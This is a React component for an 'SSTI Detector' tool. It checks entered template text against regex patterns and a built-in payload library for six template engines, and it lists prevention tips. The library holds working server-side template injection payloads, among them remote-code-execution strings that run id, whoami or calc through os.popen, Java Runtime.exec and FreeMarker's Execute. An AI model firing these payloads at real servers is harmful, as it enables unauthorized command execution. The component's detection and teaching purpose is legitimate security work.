import React, { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './Tool.module.css';

export default function SSTIDetector() {
  const [template, setTemplate] = useState('');
  const [context, setContext] = useState('');
  const [engine, setEngine] = useState('auto');
  const [results, setResults] = useState<any>(null);
  const setActiveGalaxyTool = useStore((state) => state.setActiveGalaxyTool);

  const payloads = {
    jinja2: [
      { payload: '{{7*7}}', expected: '49', description: 'Basic math evaluation' },
      { payload: '{{config.items()}}', expected: 'Config dump', description: 'Access config object' },
      { payload: "{{''.__class__.__mro__[1].__subclasses__()}}", expected: 'Class list', description: 'List all classes' },
      { payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", expected: 'Command output', description: 'RCE attempt' },
    ],
    erb: [
      { payload: '<%= 7*7 %>', expected: '49', description: 'Ruby ERB math' },
      { payload: '<%= `whoami` %>', expected: 'Username', description: 'Command execution' },
      { payload: '<%= Dir.entries("/") %>', expected: 'Directory list', description: 'File system access' },
    ],
    smarty: [
      { payload: '{$smarty.version}', expected: 'Version', description: 'Smarty version' },
      { payload: '{php}echo `id`;{/php}', expected: 'User info', description: 'PHP code execution' },
    ],
    freemarker: [
      { payload: '${7*7}', expected: '49', description: 'Math evaluation' },
      { payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', expected: 'Command output', description: 'RCE via Execute' },
    ],
    velocity: [
      { payload: '#set($x=7*7)$x', expected: '49', description: 'Velocity math' },
      { payload: '#set($str=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))', expected: 'Command', description: 'Java Runtime execution' },
    ],
    thymeleaf: [
      { payload: '${7*7}', expected: '49', description: 'Spring EL evaluation' },
      { payload: '${T(java.lang.Runtime).getRuntime().exec("calc")}', expected: 'Process', description: 'RCE via Runtime' },
    ],
  };

  const testPayloads = () => {
    if (!template) {
      alert('Please enter a template');
      return;
    }

    const detected: any[] = [];
    const testEngines = engine === 'auto' ? Object.keys(payloads) : [engine];

    testEngines.forEach((eng) => {
      const enginePayloads = payloads[eng as keyof typeof payloads];
      
      enginePayloads.forEach((p) => {
        // Check if template contains this payload
        if (template.includes(p.payload)) {
          detected.push({
            engine: eng,
            ...p,
            found: true,
            risk: p.description.includes('RCE') ? 'Critical' : 'High',
          });
        }
      });
    });

    // Analyze template for SSTI patterns
    const analysis: any = {
      template,
      engine: engine === 'auto' ? 'Auto-detect' : engine,
      patterns: [],
      vulnerable: detected.length > 0,
      detected,
    };

    // Pattern detection
    const patterns = [
      { regex: /\{\{.*\}\}/g, name: 'Jinja2/Twig double braces', risk: 'High' },
      { regex: /\{%.*%\}/g, name: 'Jinja2/Twig statements', risk: 'High' },
      { regex: /\$\{.*\}/g, name: 'FreeMarker/Velocity expressions', risk: 'High' },
      { regex: /<%.*%>/g, name: 'ERB/JSP tags', risk: 'High' },
      { regex: /\{\$.*\}/g, name: 'Smarty variables', risk: 'Medium' },
      { regex: /#set\(.*\)/g, name: 'Velocity directives', risk: 'High' },
      { regex: /__class__|__mro__|__subclasses__/g, name: 'Python object introspection', risk: 'Critical' },
      { regex: /config|request|session/gi, name: 'Framework objects access', risk: 'High' },
    ];

    patterns.forEach((p) => {
      const matches = template.match(p.regex);
      if (matches) {
        analysis.patterns.push({
          name: p.name,
          risk: p.risk,
          matches: matches.length,
          examples: matches.slice(0, 3),
        });
      }
    });

    setResults(analysis);
  };

  const loadExample = (eng: string, idx: number) => {
    const payload = payloads[eng as keyof typeof payloads][idx];
    setTemplate(payload.payload);
    setEngine(eng);
  };

  return (
    <div className={styles.tool}>
      <div className={styles.header}>
        <button className={styles.backButton} onClick={() => setActiveGalaxyTool(null)}>
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
            <path d="M19 12H5M12 19l-7-7 7-7" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </button>
        <div>
          <h2 className={styles.title}>🎭 SSTI Detector</h2>
          <p className={styles.description}>Detect Server-Side Template Injection vulnerabilities</p>
        </div>
      </div>

      <div className={styles.content}>
        <div className={styles.warning}>
          ⚠️ <strong>Warning:</strong> SSTI can lead to RCE. Only test on authorized systems.
        </div>

        <div className={styles.section}>
          <label className={styles.label}>Template Engine</label>
          <select 
            className={styles.input}
            value={engine}
            onChange={(e) => setEngine(e.target.value)}
          >
            <option value="auto">Auto-detect</option>
            <option value="jinja2">Jinja2 (Python)</option>
            <option value="erb">ERB (Ruby)</option>
            <option value="smarty">Smarty (PHP)</option>
            <option value="freemarker">FreeMarker (Java)</option>
            <option value="velocity">Velocity (Java)</option>
            <option value="thymeleaf">Thymeleaf (Java)</option>
          </select>
        </div>

        <div className={styles.section}>
          <label className={styles.label}>Template Input</label>
          <textarea
            className={styles.textarea}
            value={template}
            onChange={(e) => setTemplate(e.target.value)}
            placeholder="Enter template code to test..."
            rows={8}
          />
          <div className={styles.buttonGroup}>
            <button className={styles.button} onClick={testPayloads}>
              Test for SSTI
            </button>
            <button className={styles.buttonSecondary} onClick={() => setTemplate('')}>
              Clear
            </button>
          </div>
        </div>

        <div className={styles.section}>
          <h3 className={styles.subtitle}>SSTI Payload Library</h3>
          {Object.entries(payloads).map(([eng, plds]) => (
            <div key={eng} style={{ marginBottom: '1rem' }}>
              <h4 style={{ textTransform: 'capitalize' }}>{eng}</h4>
              {plds.map((p, idx) => (
                <div key={idx} className={styles.payloadItem}>
                  <div className={styles.payloadHeader}>
                    <code>{p.payload}</code>
                    <button 
                      className={styles.buttonSmall}
                      onClick={() => loadExample(eng, idx)}
                    >
                      Load
                    </button>
                  </div>
                  <div className={styles.payloadDescription}>
                    {p.description} → Expected: {p.expected}
                  </div>
                </div>
              ))}
            </div>
          ))}
        </div>

        {results && (
          <div className={styles.section}>
            <h3 className={styles.subtitle}>Analysis Results</h3>
            <div className={results.vulnerable ? styles.vulnerable : ''}>
              <div className={styles.info}>
                <strong>Engine:</strong> {results.engine}
              </div>
              <div className={styles.info}>
                <strong>Vulnerable:</strong> {results.vulnerable ? '⚠️ Yes' : '✅ No obvious SSTI'}
              </div>

              {results.patterns && results.patterns.length > 0 && (
                <>
                  <h4 style={{ marginTop: '1rem' }}>Detected Patterns</h4>
                  {results.patterns.map((p: any, idx: number) => (
                    <div key={idx} className={styles.vulnerability}>
                      <div className={styles.vulnHeader}>
                        <strong>{p.name}</strong>
                        <span className={`${styles.badge} ${styles[p.risk.toLowerCase()]}`}>
                          {p.risk}
                        </span>
                      </div>
                      <div>Matches: {p.matches}</div>
                      <div className={styles.codeBlock}>
                        <pre>{p.examples.join('\n')}</pre>
                      </div>
                    </div>
                  ))}
                </>
              )}

              {results.detected && results.detected.length > 0 && (
                <>
                  <h4 style={{ marginTop: '1rem', color: '#ff3366' }}>🚨 Known SSTI Payloads Detected</h4>
                  {results.detected.map((d: any, idx: number) => (
                    <div key={idx} className={styles.vulnerability}>
                      <div className={styles.vulnHeader}>
                        <strong>{d.engine.toUpperCase()}: {d.description}</strong>
                        <span className={`${styles.badge} ${styles[d.risk.toLowerCase()]}`}>
                          {d.risk}
                        </span>
                      </div>
                      <div className={styles.codeBlock}>
                        <pre>{d.payload}</pre>
                      </div>
                    </div>
                  ))}
                </>
              )}
            </div>
          </div>
        )}

        <div className={styles.section}>
          <h3 className={styles.subtitle}>SSTI Prevention</h3>
          <div className={styles.info}>
            <ul>
              <li>Never trust user input in template contexts</li>
              <li>Use sandboxed template engines</li>
              <li>Disable dangerous functions/methods</li>
              <li>Validate and sanitize template variables</li>
              <li>Use logic-less templates when possible</li>
              <li>Implement Content Security Policy (CSP)</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
}
